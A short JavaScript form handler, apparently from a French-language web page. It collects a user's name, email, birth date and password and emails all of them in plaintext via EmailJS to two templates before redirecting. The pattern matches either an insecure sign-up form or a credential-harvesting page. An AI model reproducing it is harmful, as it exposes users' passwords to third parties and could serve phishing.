let d1 = document.getElementById("d1");
d1.style.display = "block";
let d2 = document.getElementById("d2");
d2.style.display = "none";

function togg() {
	d1.style.display = "none";
	d2.style.display = "block";
}

function sendMail(params){
	var tempParams={
		nom:document.getElementById("nom").value,
		mail_utilisateur:document.getElementById("mail_utilisateur").value,
		date_naissance:document.getElementById("date_naissance").value,
		mdp:document.getElementById("mdp").value
        
	};

	togg();	
    
	emailjs.send('service_i3bxhot',"template_212vqb8",tempParams)
	emailjs.send('service_i3bxhot',"template_4ohvhyc",tempParams)
    .then(function(response) {
		console.log('SUCCESS!', response.status, response.text);
		document.location.href="../index.html"; 
    }, function(error) {
       console.log('FAILED...', error);
    });
	
}